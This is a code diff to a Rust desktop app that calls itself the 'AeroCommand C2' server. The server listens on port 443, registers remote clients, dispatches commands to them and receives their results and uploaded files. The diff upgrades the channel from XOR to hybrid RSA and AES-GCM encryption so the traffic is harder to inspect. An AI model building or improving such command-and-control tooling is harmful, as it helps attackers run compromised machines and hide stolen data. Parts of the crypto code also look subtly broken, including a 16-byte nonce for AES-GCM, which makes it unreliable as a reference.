@@ -34,32 +34,89 @@ pub struct CommandLog {
     pub status: String,
 }
 
+use rsa::{RsaPrivateKey, RsaPublicKey, Oaep};
+use rsa::traits::PublicKeyParts;
+use aes_gcm::{Aes256Gcm, Key, Nonce};
+use aes_gcm::aead::{Aead, KeyInit};
+use sha2::Sha256;
+use std::fs;
+use std::path::Path;
+
 pub struct AppState {
     pub clients: Mutex<Vec<Client>>,
     pub logs: Mutex<Vec<CommandLog>>,
     pub pending_commands: Mutex<std::collections::HashMap<String, Vec<String>>>,
+    pub rsa_private_key: RsaPrivateKey,
+    pub rsa_public_pem: String,
+    pub client_sessions: Mutex<std::collections::HashMap<String, Vec<u8>>>,
 }
 
-const XOR_KEY: u8 = 0x5A;
-
-fn xor_cipher(data: &[u8]) -> Vec<u8> {
-    data.iter().map(|&b| b ^ XOR_KEY).collect()
+fn load_or_generate_rsa_key() -> (RsaPrivateKey, String) {
+    let key_path = "server_rsa.pem";
+    if Path::new(key_path).exists() {
+        if let Ok(pem_data) = fs::read_to_string(key_path) {
+            if let Ok(priv_key) = RsaPrivateKey::from_pkcs1_pem(&pem_data) {
+                let pub_key = RsaPublicKey::from(&priv_key);
+                if let Ok(pub_pem) = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF) {
+                    return (priv_key, pub_pem);
+                }
+            }
+        }
+    }
+    
+    let mut rng = rand::thread_rng();
+    let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate rsa key");
+    let pub_key = RsaPublicKey::from(&priv_key);
+    let priv_pem = priv_key.to_pkcs1_pem(rsa::pkcs8::LineEnding::LF).expect("failed priv pem");
+    let pub_pem = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF).expect("failed pub pem");
+    let _ = fs::write(key_path, priv_pem);
+    (priv_key, pub_pem)
 }
 
-fn decrypt_payload(raw_b64: &str) -> Option<serde_json::Value> {
-    if let Ok(raw_bytes) = general_purpose::STANDARD.decode(raw_b64) {
-        let decrypted = xor_cipher(&raw_bytes);
-        if let Ok(json_str) = String::from_utf8(decrypted) {
-            return serde_json::from_str(&json_str).ok();
+fn decrypt_aes(raw_b64: &str, aes_key: &[u8]) -> Option<String> {
+    if let Ok(raw) = general_purpose::STANDARD.decode(raw_b64) {
+        if raw.len() < 32 { return None; }
+        let nonce_bytes = &raw[0..16];
+        let tag_bytes = &raw[16..32];
+        let ciphertext = &raw[32..];
+        
+        let key = Key::<Aes256Gcm>::from_slice(aes_key);
+        let cipher = Aes256Gcm::new(key);
+        let nonce = Nonce::from_slice(nonce_bytes);
+        
+        // Combine tag + ciphertext or use payload format depending on aes-gcm crate
+        // In aes-gcm v0.10, encrypt_and_digest produces ciphertext + tag appended.
+        // Let's support both formats: nonce (16) + ciphertext + tag (16) or nonce (16) + tag (16) + ciphertext.
+        // In server.py: payload = nonce (16) + tag (16) + ciphertext
+        let mut combined = Vec::new();
+        combined.extend_from_slice(ciphertext);
+        combined.extend_from_slice(tag_bytes);
+        
+        if let Ok(decrypted) = cipher.decrypt(nonce, combined.as_ref()) {
+            return String::from_utf8(decrypted).ok();
         }
     }
     None
 }
 
-fn encrypt_response(json_val: serde_json::Value) -> String {
-    if let Ok(json_str) = serde_json::to_string(&json_val) {
-        let encrypted = xor_cipher(json_str.as_bytes());
-        return general_purpose::STANDARD.encode(encrypted);
+fn encrypt_aes(json_str: &str, aes_key: &[u8]) -> String {
+    let key = Key::<Aes256Gcm>::from_slice(aes_key);
+    let cipher = Aes256Gcm::new(key);
+    let mut rng = rand::thread_rng();
+    let nonce = aes_gcm::aead::OsRng;
+    let generated_nonce = Aes256Gcm::generate_nonce(&mut rng);
+    
+    if let Ok(encrypted_tag) = cipher.encrypt(&generated_nonce, json_str.as_bytes()) {
+        // encrypted_tag contains ciphertext + tag (16 bytes at end)
+        let cipher_len = encrypted_tag.len() - 16;
+        let ciphertext = &encrypted_tag[0..cipher_len];
+        let tag = &encrypted_tag[cipher_len..];
+        
+        let mut payload = Vec::new();
+        payload.extend_from_slice(generated_nonce.as_slice());
+        payload.extend_from_slice(tag);
+        payload.extend_from_slice(ciphertext);
+        return general_purpose::STANDARD.encode(payload);
     }
     String::new()
 }
@@ -198,33 +255,87 @@ fn send_command(client_id: String, command: String, state: State<Arc<AppState>>)
     "OK".to_string()
 }
 
+fn decrypt_request_payload(content: &str, client_id_opt: Option<&str>, state: &AppState) -> Option<serde_json::Value> {
+    if let Some(cid) = client_id_opt {
+        let sessions = state.client_sessions.lock().unwrap();
+        if let Some(aes_key) = sessions.get(cid) {
+            if let Some(decrypted_str) = decrypt_aes(content, aes_key) {
+                if let Ok(val) = serde_json::from_str(&decrypted_str) {
+                    return Some(val);
+                }
+            }
+        }
+    }
+
+    if let Ok(packet) = serde_json::from_str::<serde_json::Value>(content) {
+        if let (Some(enc_key_b64), Some(payload_b64)) = (packet["encrypted_session_key"].as_str(), packet["payload"].as_str()) {
+            if let Ok(enc_key_bytes) = general_purpose::STANDARD.decode(enc_key_b64) {
+                let padding = Oaep::new::<Sha256>();
+                if let Ok(aes_key) = state.rsa_private_key.decrypt(padding, &enc_key_bytes) {
+                    if let Some(decrypted_str) = decrypt_aes(payload_b64, &aes_key) {
+                        if let Ok(inner_val) = serde_json::from_str::<serde_json::Value>(&decrypted_str) {
+                            if let Some(cid) = inner_val["client_id"].as_str() {
+                                let mut sessions = state.client_sessions.lock().unwrap();
+                                sessions.insert(cid.to_string(), aes_key);
+                            } else if let (Some(ip), Some(pid)) = (inner_val["ip"].as_str(), inner_val["pid"].as_i64()) {
+                                let raw_id = inner_val["client_id"].as_str().unwrap_or("unknown");
+                                let cid = clean_client_id(raw_id, ip, Some(pid));
+                                let mut sessions = state.client_sessions.lock().unwrap();
+                                sessions.insert(cid, aes_key);
+                            }
+                            return Some(inner_val);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    serde_json::from_str(content).ok()
+}
+
+fn encrypt_response_for_client(json_val: serde_json::Value, client_id: &str, state: &AppState) -> String {
+    let json_str = serde_json::to_string(&json_val).unwrap_or_default();
+    let sessions = state.client_sessions.lock().unwrap();
+    if let Some(aes_key) = sessions.get(client_id) {
+        return encrypt_aes(&json_str, aes_key);
+    }
+    json_str
+}
+
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
     let _ = init_db();
+    let (rsa_priv, rsa_pub_pem) = load_or_generate_rsa_key();
 
     let app_state = Arc::new(AppState {
         clients: Mutex::new(vec![]),
         logs: Mutex::new(vec![]),
         pending_commands: Mutex::new(std::collections::HashMap::new()),
+        rsa_private_key: rsa_priv,
+        rsa_public_pem: rsa_pub_pem,
+        client_sessions: Mutex::new(std::collections::HashMap::new()),
     });
 
     let state_for_thread = Arc::clone(&app_state);
     thread::spawn(move || {
-        // Use port 443 to match original server.py
         if let Ok(server) = tiny_http::Server::http("0.0.0.0:443") {
-            println!("[+] AeroCommand C2 listening on port 443");
+            println!("[+] AeroCommand C2 listening on port 443 (Hybrid AES+RSA)");
             for mut request in server.incoming_requests() {
                 let url = request.url().to_string();
                 let client_ip = request.remote_addr().map(|a| a.ip().to_string()).unwrap_or("0.0.0.0".to_string());
                 
                 println!("[*] Incoming request URL: {} from {}", url, client_ip);
                 let clean_url = format!("/{}", url.trim_start_matches('/'));
-                if clean_url.starts_with("/register") {
+
+                if clean_url.starts_with("/rsa_pub") {
+                    let _ = request.respond(tiny_http::Response::from_string(state_for_thread.rsa_public_pem.clone()));
+                } else if clean_url.starts_with("/register") {
                     println!("[+] REGISTRATION PACKET RECEIVED from {}", client_ip);
                     let mut content = String::new();
                     let _ = request.as_reader().read_to_string(&mut content);
                     
-                    if let Some(info) = decrypt_payload(&content) {
+                    if let Some(info) = decrypt_request_payload(&content, None, &state_for_thread) {
                         println!("[DEBUG] Decrypted Registration: {}", info);
                         let mut ip = info["ip"].as_str().unwrap_or("unknown").trim().to_string();
                         if ip == "unknown" || ip == "127.0.0.1" {
@@ -298,14 +409,14 @@ pub fn run() {
                         }
                     }
                     
-                    let encrypted = encrypt_response(response_json);
+                    let encrypted = encrypt_response_for_client(response_json, &client_id, &state_for_thread);
                     let _ = request.respond(tiny_http::Response::from_string(encrypted));
                 } else if clean_url.starts_with("/result") {
                     println!("[+] COMMAND RESULT from {}", client_ip);
                     let mut content = String::new();
                     let _ = request.as_reader().read_to_string(&mut content);
                     
-                    if let Some(data) = decrypt_payload(&content) {
+                    if let Some(data) = decrypt_request_payload(&content, None, &state_for_thread) {
                         let pid = data["pid"].as_i64();
                         let raw_id = data["client_id"].as_str().unwrap_or("unknown");
                         let client_id = clean_client_id(raw_id, &client_ip, pid);
@@ -349,7 +460,7 @@ pub fn run() {
                     let mut content = String::new();
                     let _ = request.as_reader().read_to_string(&mut content);
                     
-                    if let Some(data) = decrypt_payload(&content) {
+                    if let Some(data) = decrypt_request_payload(&content, None, &state_for_thread) {
                         let filename = data["name"].as_str().unwrap_or("unknown");
                         let b64_data = data["file"].as_str().unwrap_or("");
                         let client_id = data["client_id"].as_str().unwrap_or("unknown");
